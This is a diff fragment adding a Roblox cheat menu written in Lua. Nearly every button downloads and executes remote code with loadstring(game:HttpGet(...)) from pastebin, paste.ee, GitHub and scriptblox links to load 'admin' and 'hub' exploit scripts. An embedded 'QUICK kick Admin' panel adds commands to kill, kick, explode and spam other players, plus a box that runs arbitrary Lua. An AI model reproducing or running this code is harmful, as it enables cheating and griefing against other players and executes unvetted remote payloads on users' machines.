+    loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "666 2",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/H5td8jx4"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "666 3",
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/BcB1x3D0"))()  	
+  	end   
+})
+
+local AdminS = Window:MakeTab({
+	Name = "Admins",
+	Icon = "rbxassetid://6034281908",
+	PremiumOnly = false
+})
+      
+AdminS:AddButton({
+  Name = "Infinite Yield OP",
+  Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Nameless Admin (No byfron Kick) OP",
+  Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/FD2Team/Nameless-Admin-No-Byfron-Kick/main/Source",true))() 	
+    end   
+})
+
+AdminS:AddButton({
+  Name = "Leg Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
+    end   
+})
+
+AdminS:AddButton({
+  Name = "CMD-X",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "IV Admin (Doesn't works with some executors) OP",
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v3.lua'))()	
+    end   
+})
+
+AdminS:AddButton({
+  Name = "Reviz Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/Nh7n0hdX', true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Shattervast Admin",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/iL4NRDux', true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Fates Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Adonis Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/HYshM"))();
+    end    
+})
+
+Tab:AddButton({
+	Name = "QUICK kick Admin",
+	Callback = function()
+            local Settings = {
+              ["Name"] = "transIate",
+              ["Local"] = true,
+              ["Context"] = true
+            }
+
+            local GetPlayer = function()
+              if Settings.Context or Settings.Local then
+                  return Game.Players.LocalPlayer
+              else
+                  return Game.Players:FindFirstChild(Settings.Name) or nil
+              end
+            end
+
+            local CurrentPlayer = GetPlayer()
+
+
+            --[[ We need someway to do this without substrings, right? ]]--
+            Explode = function(String)
+              local List = {}
+              for Item in string.gmatch(String, "%S+") do
+                  table.insert(List, Item)
+              end
+              return List
+            end
+
+            --[[ In all of my days of scripting, I feel like this is the worst recurse function I've made... ]]--
+            Recurse = function(Location, Type, Objects)
+              if not Objects or type(Objects) ~= "table" then
+                  Objects = {}
+              end
+              for Index, Child in pairs(Location:GetChildren()) do
+                  if Child:IsA(Type) then
+                      table.insert(Objects, Child)
+                  end
+                  Recurse(Child, Type, Objects)
+              end
+              return Objects
+            end
+
+            --[[ But this is a pretty good players-getter ]]--
+            local GetPlayers = function(String)
+              local List = Explode(String)
+              local Players = {}
+              for Index, Value in pairs(List) do
+                  for Index, Player in pairs(Game.Players:GetPlayers()) do
+                      if Value:lower() == "all" then
+                          table.insert(Players, Player)
+                      elseif Value:lower() == "others" then
+                          if Player ~= CurrentPlayer then
+                              table.insert(Players, Player)
+                          end
+                      elseif Value:lower() == "me" then
+                          table.insert(Players, CurrentPlayer)
+                          break
+                      elseif Value:lower() == "guests" then
+                          if Player.Name:sub(1, 6) == "Guest " then
+                              table.insert(Players, Player)
+                          end
+                      elseif Value:lower() == "nonguests" then
+                          if Player.Name:sub(1, 6) ~= "Guest " then
+                              table.insert(Players, Player)
+                          end                        
+                      elseif Value:lower() == "nonbc" then
+                          if Player.MembershipType == Enum.MembershipType.None then
+                              table.insert(Players, Player)
+                          end
+                      elseif Value:lower() == "bc" then
+                          if Player.MembershipType == Enum.MembershipType.BuildersClub then
+                              table.insert(Players, Player)
+                          end
+                      elseif Value:lower() == "tbc" then
+                          if Player.MembershipType == Enum.MembershipType.TurboBuildersClub then
+                              table.insert(Players, Player)
+                          end
+                      elseif Value:lower() == "obc" then
+                          if Player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+                              table.insert(Players, Player)
+                          end
+                      else
+                          if Player.Name:lower():sub(1, #Value) == Value:lower() then
+                              table.insert(Players, Player)
+                          end
+                      end
+                  end
+              end
+              return Players
+            end
+
+            --[[ Commands' Functions, 1 argument only! (The textbox text) ]]--
+            local Commands = {
+              {"Kill", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character:BreakJoints() end)
+                  end
+              end},
+              {"Heal", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth end)
+                  end
+              end},
+              {"Godmode", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.MaxHealth = math.huge end)
+                  end
+              end},
+              {"Ungodmode", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.MaxHealth = 100 end)
+                  end
+              end},
+              {"FastSpeed", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.WalkSpeed = 50 end)
+                  end
+              end},
+              {"NormalSpeed", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.WalkSpeed = 16 end)
+                  end
+              end},
+              {'DoD',function(String)
+                  local PlayerList=GetPlayers(String)
+                  for i,v in pairs(PlayerList) do
+                  pcall(function()
+            _f=function(_obj)
+            for x,_ in next,_obj:children''do
+            if(_:IsA'BasePart')then
+            v.Anchored=false;
+            v.BrickColor=BrickColor.new'Institutional white';
+            bv=Instance.new'BodyVelocity';
+            bv.Parent=v;
+            bv.maxForce=Vector3.new(100000000,100000000,100000000);
+            end;
+            _f(v)end end _f(workspace)
+                   end)
+                  end 
+              end},
+              {'paper',function(String)
+              local PlayerList=GetPlayers(String)
+              for i,v in pairs(PlayerList)do
+                  pcall(function()
+                  for i,v in next,v.Character:children''do
+            if(v:IsA'BasePart')then
+            local b=Instance.new('SpecialMesh',v);
+            b.MeshType=Enum.MeshType.Brick;b.Scale=Vector3.new(1,1,.00001);
+            elseif(v:IsA'Hat')then  v.Handle.Mesh.Scale=Vector3.new(1,1,.005); 
+              elseif(v:IsA'CharacterMesh')then v:destroy''end end end)end end},
+              {'dance',function(String)
+                  PlayerList=GetPlayers(String);
+                  for i,v in pairs,(PlayerList) do
+                      pcall(function()
+                      local welds={};
+            char=v.Character;
+            c=function(v)
+              local r={};
+              for _,d in next,v:children''do
+                  table.insert(r,d);
+                  for _,o in next,c(d)do
+                      table.insert(r,o);
+                  end;
+              end;
+              return r;
+            end;
+            for _,v in next,c(char)do
+              if(v.className:find'Weld'or v.className:find'Motor6D')then
+                  table.insert(welds,v);
+              end;
+            end;
+            while wait''do
+              coroutine.wrap(function()
+                  for _,v in next,welds do
+                      local args={0,0,0};
+                      local toUse=math.random(1,3);
+                      local done={};
+                      for i=1,toUse do
+                          local asdf=math.random(1,3);
+                          repeat
+                              asdf=math.random(1,3);
+                          until done[asdf]==nil;
+                          done[asdf]=true;
+                          args[asdf]=.075;
+                      end;
+                      v.C0=v.C0*CFrame.Angles(unpack(args));
+                  end;
+              end)();
+            end;end)end end},
+              {'look',function(String)
+                  local PlayerList=GetPlayers(String)
+                  for i,v in pairs,(PlayerList) do
+                      pcall(function()
+            local player=v
+            local mouse=player:getMouse'';
+            local char=player.Character;
+            local head=char.Head;
+            local torso=char.Torso;
+            local neck=torso.Neck;
+            mouse.Move:connect(function()
+            neck.C0=CFrame.new(0,1,0);
+            local headCF=torso.CFrame*CFrame.new(0,0.5,0);
+            local newCF=CFrame.new(headCF.p,mouse.Hit.p);
+            neck.C1=newCF:inverse''*torso.CFrame;
+              end);end)end end},
+              {"SlowSpeed", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.WalkSpeed = 5 end)
+                  end
+              end},
+              {"Mute",function(String)
+                  local PlayerList=GetPlayers(String)
+                  for i,v in pairs,(PlayerList)do
+            v.StarterGui:SetCoreGuiEnabled('All',false);
+              end end},
+              {"unMute",function(String)
+                  local PlayerList=GetPlayers(String)
+                  for i,v in pairs,(PlayerList)do
+            v.StarterGui:SetCoreGuiEnabled('All',true);
+              end end},
+              {"Stand", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.Sit = false v.Character.Humanoid.PlatformStand = false end)
+                  end
+              end},
+              {"Sit", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.Sit = true end)
+                  end
+              end},
+              {"Lie", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.PlatformStand = true end)
+                  end
+              end},
+              {"Jump", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Humanoid.Jump = true end)
+                  end
+              end},
+              {"Respawn", function(String) --[[ Not using LoadCharacter in-case it's a local script. ]]--
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      local FakeChar = Instance.new("Model", Game.Workspace)
+                      Instance.new("Part", FakeChar).Name = "Torso"
+                      Instance.new("Humanoid", FakeChar)
+                      pcall(function() v.Character = FakeChar end)
+                  end
+              end},
+              {"ForceField", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Instance.new("ForceField", v.Character) end)
+                  end
+              end},
+              {"UnForceField", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() while v.Character:FindFirstChild("ForceField") do v.Character.ForceField:Destroy() end end)
+                  end
+              end},
+              {"Sparkles", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Instance.new("Sparkles", v.Character.Torso) end)
+                  end
+              end},
+              {"Unsparkles", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() while v.Character.Torso:FindFirstChild("Sparkles") do v.Character.Torso.Sparkles:Destroy() end end)
+                  end
+              end},
+              {"Fire", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Instance.new("Fire", v.Character.Torso) end)
+                  end
+              end},
+              {"Unfire", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() while v.Character.Torso:FindFirstChild("Fire") do v.Character.Torso.Fire:Destroy() end end)
+                  end
+              end},
+              {"Smoke", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Instance.new("Smoke", v.Character.Torso) end)
+                  end
+              end},
+              {"Unsmoke", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() while v.Character.Torso:FindFirstChild("Smoke") do v.Character.Torso.Smoke:Destroy() end end)
+                  end
+              end},
+              {"Visible", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() local Objects = Recurse(v.Character, "BasePart") for i, v in pairs(Objects) do v.Transparency = 0 end end)
+                  end
+              end},
+              {"Invisible", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() local Objects = Recurse(v.Character, "BasePart") for i, v in pairs(Objects) do v.Transparency = 1 end end)
+                  end
+              end},
+              {"Explode", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Instance.new("Explosion", Workspace).Position = v.Character.Torso.Position end)
+                  end
+              end},
+              {"RemoveCharacter", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character:Destroy() end)
+                  end
+              end},
+              {"TeleTo", function(String)
+                  local PlayerList = GetPlayers(String)
+                  PlayerList = PlayerList[1]
+                  pcall(function() CurrentPlayer.Character.Torso.CFrame = PlayerList.Character.Torso.CFrame end)
+              end},
+              {"TeleHere", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Character.Torso.CFrame = CurrentPlayer.Character.Torso.CFrame end)
+                  end
+              end},
+              {"Kick", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v:Destroy() end)
+                  end
+              end},
+              {"Disconnect", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.Parent = nil v.Parent = Game.Players end)
+                  end
+              end},
+              {"Gear", function(String)
+                  local Item = Game:GetService("InsertService"):LoadAsset(tonumber(String))
+                  if Item then
+                      for Index, Child in pairs(Item:children()) do
+                          if Child:IsA("Tool") or Child:IsA("HopperBin") then
+                              pcall(function() Child.Parent = Game.Players.LocalPlayer.Backpack end)
+                          end
+                      end
+                      Item:Destroy()
+                  end
+              end},
+              {"ColorMap", function()
+                  local Objects = Recurse(Game.Workspace, "BasePart")
+                  for i, v in pairs(Objects) do
+                      math.randomseed(tick())
+                      v.Transparency = math.random()
+                      v.Reflectance = math.random()
+                      v.BrickColor = BrickColor.Random()
+                  end
+              end},
+              {"RobloxLock", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.RobloxLocked = true v.Character.RobloxLocked = true end)
+                  end
+              end},
+              {"UnRobloxLock", function(String)
+                  local PlayerList = GetPlayers(String)
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() v.RobloxLocked = false v.Character.RobloxLocked = false end)
+                  end
+              end},
+              {"Announce", function(String)
+                  local PlayerList = GetPlayers("all")
+                  for i, v in pairs(PlayerList) do
+                      pcall(function() Game:GetService("Chat"):Chat(v.Character, String) end)
+                  end
+              end},
+              {"Spam", function(String)
+                  ypcall(function() for i = 1, 100 do Game.Players:Chat(String) Wait(0.1) end end)
+              end},
+            }
+
+            local CommandAt = 1
+
+            --[[
+            Keywords (start with "$")
+              All - All players.
+              Others - All players excluding you.
+              Me - Only you.
+              Guests - All guests.
+              NonGuests - All non-guests.
+              NonBC - All players without any form of BC.
+              BC/TBC/OBC - All players with BC/TBC/OBC.
+            Notes
+              If the keyword doesn't exist, it will find player(s) that name start with string.
+              When selecting players, you can use spaces to add more to the list.
+            ]]--
+
+            --[[ The easy part, getting the command. ]]--
+            function GetRunnable(Text)
+              for Index, Value in pairs(Commands) do
+                  if Value[1] == Text then
+                      return Value[2]
+                  end
+              end
+            end
+
+            --[[ The harder part... ]]--
+            local DefaultTextBox = Instance.new("TextBox")
+            DefaultTextBox.BackgroundColor3 = Color3.new(0, 0, 0)
+            DefaultTextBox.BorderColor3 = Color3.new(1, 1, 1)
+            DefaultTextBox.ClearTextOnFocus = true
+            DefaultTextBox.Font = 2
+            DefaultTextBox.FontSize = 4
+            DefaultTextBox.TextStrokeColor3 = Color3.new(1, 1, 1)
+            DefaultTextBox.TextStrokeTransparency = 0
+            DefaultTextBox.TextXAlignment = 0
+            DefaultTextBox.TextYAlignment = 0
+
+            local DefaultTextButton = Instance.new("TextButton")
+            DefaultTextButton.BackgroundColor3 = Color3.new(0, 0, 0)
+            DefaultTextButton.BorderColor3 = Color3.new(1, 1, 1)
+            DefaultTextButton.Font = 2
+            DefaultTextButton.FontSize = 4
+            DefaultTextButton.TextStrokeColor3 = Color3.new(1, 1, 1)
+            DefaultTextButton.TextStrokeTransparency = 0
+            DefaultTextButton.TextXAlignment = 2
+            DefaultTextButton.TextYAlignment = 1
+
+            local DefaultTextLabel = Instance.new("TextLabel")
+            DefaultTextLabel.Font = 2
+            DefaultTextLabel.FontSize = 5
+            DefaultTextLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
+            DefaultTextLabel.TextStrokeTransparency = 0
+            DefaultTextLabel.TextXAlignment = 2
+            DefaultTextLabel.TextYAlignment = 1
+
+            local MainGUI = Instance.new("ScreenGui")
+            local MainFrame = Instance.new("Frame", MainGUI)
+            MainFrame.Style = 3
+            MainFrame.Visible = false
+            MainFrame.Size = UDim2.new(0, 500, 0, 250)
+            MainFrame.Position = UDim2.new(0.5, -250, 0.5, -125)
+
+            local ToggleButton = DefaultTextButton:Clone()
+            ToggleButton.Size = UDim2.new(0, 100, 0, 25)
+            ToggleButton.Position = UDim2.new(0, 0, 0.5, 0)
+            ToggleButton.Text = "Toggle CKM SC"
+            ToggleButton.MouseButton1Click:connect(function()
+              MainFrame.Visible = not MainFrame.Visible
+            end)
+            ToggleButton.Parent = MainGUI
+
+            local QuickKickTextBox = DefaultTextBox:Clone()
+            QuickKickTextBox.Size = UDim2.new(0, 150, 0, 25)
+            QuickKickTextBox.Position = UDim2.new(0, 0, 0.5, 50)
+            QuickKickTextBox.Text = "Quick Kick"
+            QuickKickTextBox.FocusLost:connect(function(Enter)
+              if Enter then
+                  local Func = GetRunnable("Kick")
+                  coroutine.resume(coroutine.create(function() ypcall(function() Func(QuickKickTextBox.Text) end) end))
+              end
+            end)
+            QuickKickTextBox.Parent = MainGUI
+
+            local Title = DefaultTextLabel:Clone()
+            Title.Position = UDim2.new(0.5, 0, 0, 5)
+            Title.Text = "Dreemz Server Control V1.1"
+            Title.Parent = MainFrame
+
+            local Keywords = DefaultTextLabel:Clone()
+            Keywords.Position = UDim2.new(0.5, 0, 0, 30)
+            Keywords.FontSize = 4
+            Keywords.Text = "Keywords: all, others, me, guests, nonguests, nonbc, bc, tbc, obc"
+            Keywords.Parent = MainFrame
+
+            local ScriptBox = DefaultTextBox:Clone()
+            ScriptBox.Size = UDim2.new(1, 0, 0, 100)
+            ScriptBox.Position = UDim2.new(0, 0, 0, 50)
+            ScriptBox.Text = "Click ENTER to execute."
+            ScriptBox.FocusLost:connect(function(Enter)
+              if Enter then
+                  local Success, Error = ypcall(loadstring(ScriptBox.Text))
+                  if Success then
+                      ScriptBox.Text = "Executed Successfully"
+                  else
+                      ScriptBox.Text = Error
+                  end
+              end
+            end)
+            ScriptBox.Parent = MainFrame
+
+            local PlayerLabel = DefaultTextLabel:Clone()
+            PlayerLabel.Position = UDim2.new(0, 25, 0, 210)
+            PlayerLabel.FontSize = 4
+            PlayerLabel.Text = "Players"
+            PlayerLabel.Parent = MainFrame
+
+            local PlayerBox = DefaultTextBox:Clone()
+            PlayerBox.Size = UDim2.new(0.75, 0, 0, 15)
+            PlayerBox.Position = UDim2.new(0, 60, 0, 205)
+            PlayerBox.Text = "Argument (Players or String [Depending on Command])."
+            PlayerBox.Parent = MainFrame
+
+            local CurrentCommand = DefaultTextButton:Clone()
+            CurrentCommand.Size = UDim2.new(0.5, 0, 0, 15)
+            CurrentCommand.Position = UDim2.new(0.25, 0, 0, 175)
+            CurrentCommand.FontSize = 4
+            CurrentCommand.Text = Commands[CommandAt][1]
+            CurrentCommand.MouseButton1Down:connect(function()
+              local Func = GetRunnable(CurrentCommand.Text)
+              coroutine.resume(coroutine.create(function() ypcall(function() Func(PlayerBox.Text) end) end))
+            end)
+            CurrentCommand.Parent = MainFrame
+
+            local PreviousCommand = DefaultTextButton:Clone()
+            PreviousCommand.Size = UDim2.new(0.25, 0, 0, 15)
+            PreviousCommand.Position = UDim2.new(0, 0, 0, 175)
+            PreviousCommand.Text = "<<"
+            PreviousCommand.MouseButton1Click:connect(function()
+              if CommandAt - 1 >= 1 then
+                  CommandAt = CommandAt - 1
+              else
+                  CommandAt = #Commands
+              end
+              CurrentCommand.Text = Commands[CommandAt][1]
+            end)
+            PreviousCommand.Parent = MainFrame
+
+            local NextCommand = DefaultTextButton:Clone()
+            NextCommand.Size = UDim2.new(0.25, 0, 0, 15)
+            NextCommand.Position = UDim2.new(0.75, 0, 0, 175)
+            NextCommand.Text = ">>"
+            NextCommand.MouseButton1Click:connect(function()
+              if CommandAt + 1 <= #Commands then
+                  CommandAt = CommandAt + 1
+              else
+                  CommandAt = 1
+              end
+              CurrentCommand.Text = Commands[CommandAt][1]
+            end)
+            NextCommand.Parent = MainFrame
+
+
+            MainGUI.Parent = Settings.Context and Game.CoreGui or CurrentPlayer.PlayerGui
+  	end   
+})
+      
+AdminS:AddButton({
+  Name = "Homebrew Admin",
+  Callback = function()
+        _G.CustomUI = false
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
+    end    
+})
+
+AdminS:AddButton({
+  Name = "Kohls Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/237ERiAT"))();
+    end    
+})
+
+AdminS:AddButton({
+  Name = "IceGear Admin",
+  Callback = function()
+loadstring(game:HttpGet(('https://paste.ee/r/e6T8l'),true))()
+    end    
+})
+AdminS:AddButton({
+  Name = "Overflow Admin",
+  Callback = function()
+loadstring(game:HttpGet(('https://paste.ee/r/KaeZg'),true))()
+              end
+            })
+
+AdminS:AddButton({
+  Name = "Ultimate Admin",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/bVjM0xCS", true))()
+    end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Hubs/Guis",
+	Icon = "rbxassetid://6035053285",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+        Name = " Universal Hubs"
+})
+      
+Tab:AddButton({
+	Name = "Game Destroyer Hub",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-HUB-Destroyer-V4/main/Games%20HUB%20Destroyer%20V4"))()   	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "Goust Hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "Ez Hub",
+	Callback = function()
+   loadstring(game:HttpGet("https://scriptblox.com/raw/Ez-Hub_168"))()   	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "Unfair Hub",
+	Callback = function()
+     loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))() 	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "Owl Hub",
+	Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();   	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "Pendulam Hub",
+	Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))() 	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+      
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+      	
+  	end   
+})
+local Section = Tab:AddSection({
+        Name = "Guis"
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
